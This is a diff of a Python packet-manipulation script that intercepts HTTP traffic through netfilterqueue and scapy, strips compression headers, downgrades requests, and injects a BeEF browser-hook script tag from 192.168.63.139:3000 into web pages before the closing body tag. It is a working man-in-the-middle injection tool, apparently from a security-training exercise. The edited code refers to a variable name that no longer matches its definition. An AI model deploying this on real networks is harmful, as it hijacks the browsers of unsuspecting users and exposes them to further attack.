@@ -1,8 +1,7 @@
-#!/usr/bin/env python3
-# Rebuild - View README for testing parameters.
 import netfilterqueue
 from scapy.layers.inet import IP, TCP, UDP
 from scapy.layers.dns import Raw
+import http.client
 import re
 
 AcceptEncodingRegex = "Accept-Encoding:.*?\\r\\n"
@@ -15,14 +14,15 @@ beef_injection_code = '<script src="http://192.168.63.139:3000/hook.js"></script
 # Take our modified load and set it to the packet load
 def set_load(packet, load):
     packet[Raw].load = load
-    # For scapy to recalculate IP and Chksum for updated load, delete them
-    # Making the change from del, to *= None, does not affect the results
+    # Scapy to recalculate IP and Chksum for updated load
     del packet[IP].len
     del packet[IP].chksum
     del packet[TCP].chksum
     return packet
 
 def process_packet(packet):
+    # print("[+] Processing packet...")
+    # print(packet.show())
     # convert the raw netfilter packet into a Scapy packet
     scapy_packet= IP(packet.get_payload())
     if scapy_packet.haslayer(Raw):
@@ -33,17 +33,22 @@ def process_packet(packet):
             load = scapy_packet[Raw].load.decode()
 
             # 1. HANDLE REQUESTS (Going to the Server)
-            if scapy_packet.haslayer(TCP) and scapy_packet[TCP].dport == 80:
-                print("[+] HTTP Request Intercepted:  ")
+                # change port from HTTP port 80 to 8080, Bettercap redirection proxy
+            if scapy_packet[TCP].dport == 80:
+                print("[+] HTTP Request:  ")
                 # Strip encoding to prevent compression
                 # Find "Accept-Encoding" in payload, replace with ""
                 load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
+                # Replace HTTP 1.1 with HTTP 1.0 encoding issue
+                load = load.replace("HTTP/1.1", "HTTP/1.0")
+                print(load)
 
             # 2. HANDLE RESPONSES (Coming from the Server)
-            elif scapy_packet.haslayer(TCP) and scapy_packet[TCP].sport == 80:
-                print("[+] HTTP Response Intercepted:  ")
+                # change port from HTTP port 80 to 8080, Bettercap redirection proxy
+            elif scapy_packet[TCP].sport == 80:
+                print("[+] HTTP Response:  ")
                 # method replace string with another string
-                load = load.replace("</body>", beef_injection_code + "</body>")
+                load = load.replace("</body>", injection_code + "</body>")
                 # Update Content-Length so the browser doesn't cut off the end of the page
                 content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
                 # if value, and, check this is a html response, not an image etc
@@ -67,7 +72,7 @@ if __name__ == "__main__":
     try:
         print("[*] Initializing NetfilterQueue...")
         queue = netfilterqueue.NetfilterQueue()
-        queue.bind(3, process_packet)
+        queue.bind(0, process_packet)
         queue.run()
     except KeyboardInterrupt:
         print("\n[!] Ctrl+C detected. Unbinding queue and exiting...")
